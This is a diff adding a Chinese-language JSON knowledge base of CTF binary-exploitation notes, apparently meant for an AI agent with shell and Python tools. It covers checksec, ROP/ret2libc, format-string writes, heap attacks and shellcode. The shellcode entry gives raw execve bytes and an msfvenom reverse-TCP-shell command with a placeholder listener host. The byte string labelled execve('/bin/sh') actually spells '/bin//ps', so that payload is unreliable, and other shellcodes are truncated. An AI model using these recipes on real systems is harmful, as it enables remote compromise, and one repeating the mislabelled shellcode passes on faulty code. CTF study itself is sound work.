@@ -1,0 +1,37 @@
+[
+  {
+    "title": "PWN 入门 — ELF 保护机制 checksec",
+    "content": "ELF 保护检测: 使用 checksec 或 pwntools: ELF('./binary').checksec(). 保护机制: NX (No eXecute, 栈不可执行, 绕过: ROP); Canary (栈保护, 绕过: 泄露 canary 值); PIE (位置无关, 地址随机化, 绕过: 泄露基址); RELRO (只读重定位, Full RELRO 阻止 GOT 覆写, Partial RELRO 可覆写 GOT). 无保护时可直接注入 shellcode 到栈上执行. PIE 禁用时固定地址可直接使用 gadgets.",
+    "tags": "pwn,checksec,elf,nx,canary,pie,relro",
+    "tools": "binary_analysis, file_analyzer",
+    "checklist": "1. checksec 查看保护; 2. file/arch 识别架构; 3. strings 查看字符串; 4. 确定利用策略"
+  },
+  {
+    "title": "ROP 链构造",
+    "content": "ROP (Return-Oriented Programming) 用于绕过 NX. 步骤: 1) 找 gadgets (pop rdi; ret, pop rsi; ret 等); 2) 在 libc 中找 system 和 /bin/sh; 3) 构造链: padding + pop_rdi + binsh_addr + system_addr. 工具: ROPgadget --binary, ropper, pwntools. 常用: ROPgadget --binary libc.so.6 --only 'pop|ret'. x64 传参: rdi, rsi, rdx, rcx, r8, r9. x86 传参: 栈传参. ret2libc: 泄露 puts@got → 计算 libc 基址 → 调用 system('/bin/sh').",
+    "tags": "pwn,rop,ret2libc,gadget",
+    "tools": "binary_analysis, execute_python_code, execute_shell_command",
+    "checklist": "1. 找溢出偏移; 2. 泄露 libc 地址; 3. 计算 libc 基址; 4. 找 system/binsh; 5. 构造 ROP 链"
+  },
+  {
+    "title": "格式化字符串漏洞",
+    "content": "格式化字符串: printf(user_input) 导致 %x 泄露栈数据, %n 写入内存. 泄露栈: %p %p %p... 或 %x %x %x..., %6$p (直接取第 6 个参数). 利用: %n 写入已打印字节数到指针地址. 技巧: 1) 使用 %{offset}$n 精确写入; 2) 分两次写入 (写入两个字节); 3) 配合 %{count}c 控制写入值. pwntools: fmtstr_payload(offset, {target_addr: value}). 常用: 覆写 GOT 表项为 system 或 one_gadget 地址.",
+    "tags": "pwn,format string,fmtstr",
+    "tools": "binary_analysis, execute_python_code",
+    "checklist": "1. 确认格式化字符串漏洞; 2. 找偏移; 3. 泄露地址 (canary/libc/PIE); 4. 构造写入 payload"
+  },
+  {
+    "title": "堆利用基础",
+    "content": "堆利用常见手法: 1) Use-After-Free (UAF): free 后指针未置空, 可通过分配相同大小对象控制; 2) Double Free: 重复释放, 导致 fastbin/tcache 循环, 可分配到任意地址; 3) Heap Overflow: 堆块数据溢出覆盖下个堆块的 metadata. tcache (glibc 2.26+): tcache bin 无大小检查, double free 更易利用但需注意 tcache_perthread_struct. fastbin: 单向链表, 可伪造 fd 指针分配到任意位置. pwntools: from pwn import *; libc = ELF('./libc.so.6'); one_gadget = [0x...].",
+    "tags": "pwn,heap,uaf,double free,tcache,fastbin",
+    "tools": "execute_python_code, binary_analysis",
+    "checklist": "1. 识别堆漏洞类型; 2. 确定 glibc 版本; 3. 构造分配/释放序列; 4. 泄露 libc/heap 地址; 5. 任意写 → getshell"
+  },
+  {
+    "title": "Shellcode 编写",
+    "content": "常用 shellcode: 1) execve('/bin/sh', 0, 0) — x86 (21 字节): \\x31\\xc0\\x50\\x68...; 2) x64 (27 字节): \\x48\\x31\\xf6\\x56\\x48\\xbf...; 3) 反向连接 shell: 使用 msfvenom 生成: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f python. 约束: 无空字节 (NULL-free), 短 shellcode 需编码器. [x64] execve('/bin/sh') shellcode: \\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x70\\x73\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05.",
+    "tags": "pwn,shellcode,execve,msfvenom",
+    "tools": "execute_python_code, execute_shell_command",
+    "checklist": "1. 确认架构 (x86/x64); 2. 确定可用字节约束; 3. 生成/编写 shellcode; 4. 注入并执行"
+  }
+]
